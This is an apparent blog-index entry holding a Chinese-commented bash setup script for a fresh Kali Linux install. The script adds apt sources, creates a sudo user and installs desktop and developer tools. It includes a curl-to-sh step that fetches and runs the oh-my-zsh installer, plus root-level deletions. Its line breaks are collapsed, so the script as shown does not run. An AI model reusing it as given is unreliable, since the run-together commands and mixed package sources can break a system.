ED444FF07D8D0BF6echo &quot;deb http://http.kali.org/kali kali-rolling main non-free contrib&quot; &gt;&gt; /etc/apt/sources.listecho &quot;deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib&quot; &gt;&gt; /etc/apt/sources.listecho &quot;deb http://mirrors.aliyun.com/debian stable main contrib non-free&quot;  &gt;&gt; /etc/apt/sources.listecho &quot;[ok] 添加kali源成功！&quot;echo &quot;&quot;echo &quot;[+] 添加一个普通用户&quot;read -p &quot;请输入用户名: &quot; usernameuseradd -m -G sudo,video,audio,cdrom -s /bin/bash $usernameecho &quot;请设置用户密码：&quot;passwd $usernameecho &quot;[ok] 添加普通用户成功！&quot;echo &quot;&quot;# 安装内核头文件echo &quot;[+] 安装内核头文件... &quot;apt-get -y install linux-headers-$(uname -r)echo &quot;&quot;echo &quot;[ok] 内核头文件安装成功！&quot;echo &quot;&quot;# 解决kali启动时静音问题echo &quot;[+] 安装 alsa-utils 解决kali启动时静音问题&quot;apt-get -y install alsa-utilsecho &quot;[ok] 安装 alsa-utils 成功！&quot;echo &quot;&quot;echo &quot;[+] 添加PPPoE拨号连接功能&quot;apt-get install pppoe pppoeconfecho &quot;[ok] 安装PPPoE成功!&quot;echo &quot;      &gt;&gt; 你可以使用 nm-connection-editor 命令管理pppoe连接&quot;echo &quot;&quot;echo &quot;[+] 添加VPN支持: PPTP IPsec/IKEv2 vpnc network-manager-ssh&quot;apt-get -y install network-manager-pptp network-manager-pptp-gnome network-manager-strongswan network-manager-vpnc network-manager-vpnc-gnome network-manager-sshecho &quot;[ok] 成功添加vpn支持!&quot;echo &quot;&quot;# Base Toolecho &quot;[+] 安装一些必备系统工具：谷歌拼音输入法、垃圾清理工具、截图工具、快速启动工具、软件包管理工具等&quot;apt-get -y install  fcitx fcitx-googlepinyin flameshot bleachbit gdebi synaptic synapse catfish scrot vokoscreen chromiumecho &quot;[ok] 成功安装系统必备软件!&quot;echo &quot;&quot;# Server Toolsecho &quot;[+] 安装服务器连接管理工具：remmina、filezilla&quot;apt-get -y install remmina filezillaecho &quot;[ok] 安装服务器连接管理工具成功!&quot;echo &quot;&quot;# 美化echo &quot;[+] 设置窗口按钮到左侧&quot;gsettings set org.gnome.desktop.wm.preferences button-layout &#39;close,maximize,minimize:&#39;echo &quot;[ok] 设置窗口按钮到左侧成功！&quot;echo &quot;&quot;echo &quot;[+] 安装中文字体&quot;apt-get -y install fonts-wqy-microhei fonts-wqy-zenheiecho &quot;[ok] 安装中文字体成功！&quot;echo &quot;&quot;echo &quot;[+] 安装基本美化工具&quot;apt-get -y install zsh screenfetch neofetch figlet peek#apt-get -y install cairo-dockecho &quot;[ok] 安装成功！&quot;echo &quot;&quot;echo &quot;[+] 删除无用主题&quot;cd /usr/share/themes/ &amp;&amp; rm -rf Albatross Blackbird Bluebird HighContrast Greybird*echo &quot;[ok] 删除成功！&quot;# Security Toolsecho &quot;[+] 安装图形化十六进制编辑器bless&quot;apt-get -y install blessecho &quot;[ok] 安装成功！&quot;echo &quot;&quot;echo &quot;[+] 安装firewalld防火墙及iptables图形化管理工具gufw &quot;apt-get -y install gufw firewalld firewall-applet#systemctl enable firewalld.serviceecho &quot;[ok] 安装成功！&quot;echo &quot;&quot;# Install sublime text 3echo &quot;[+] 安装sublime text 3，速度可能会比较慢&quot;wget -qO - https://download.sublimetext.com/sublimehq-pub.gpg | sudo apt-key add -sudo apt-get install apt-transport-httpsecho &quot;deb https://download.sublimetext.com/ apt/stable/&quot; | sudo tee /etc/apt/sources.list.d/sublime-text.listapt-get updateapt-get install sublime-textecho &quot;[+] 解决sublime-text 中文输入问题&quot;git clone https://github.com/lyfeyaj/sublime-text-imfix.gitcd sublime-text-imfixcp ./lib/libsublime-imfix.so /opt/sublime_text/ &amp;&amp; cp ./src/subl /usr/bin/echo &quot;[ok] 修复成功。输入subl命令启动sublime text即可输入中文！&quot;echo &quot;&quot;# Install typoraecho &quot;[+] 安装 typora，速度可能会比较慢&quot;sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys BA300B7755AFCFAEecho &quot;deb http://typora.io linux/&quot; | sudo tee /etc/apt/sources.list.d/typora.listsudo apt-get update -ysudo apt-get install typoraecho &quot;&quot;echo &quot;[+] 安装 node npm&quot;wget https://npm.taobao.org/mirrors/node/v8.9.3/node-v8.9.3.tar.gztar zxvf node-v8.9.3.tar.gz &amp;&amp; mv node-v8.9.3-linux-x64 /optln -s /opt/node-v8.9.3-linux-x64/bin/node /usr/local/bin/nodeln -s /opt/node-v8.9.3-linux-x64/bin/npm /usr/local/bin/npmrm ~/node-v8.9.3.tar.gzecho &quot;&quot;echo &quot;[+] 清除垃圾 ......&quot;apt-get clean &amp;&amp; apt-get autoclean &amp;&amp;  apt-get autoremove -y　echo &quot;[+] Cleaning OK!&quot;# Install oh-my-zsh# 普通用户就以普通权限安装apt-get install zshecho &quot;[+] Install oh-my-zsh&quot;sh -c &quot;$(curl -fsSL https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh)&quot;echo &quot; Setting oh-my-zsh be the default terminal&quot;chsh -s /bin/zshecho &quot;&quot;neofetchecho &quot;[OK] 所有任务完成!&quot;</code></pre><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Kali </category>
          
      </categories>
      
      
        <tags>
            
            <tag> system </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
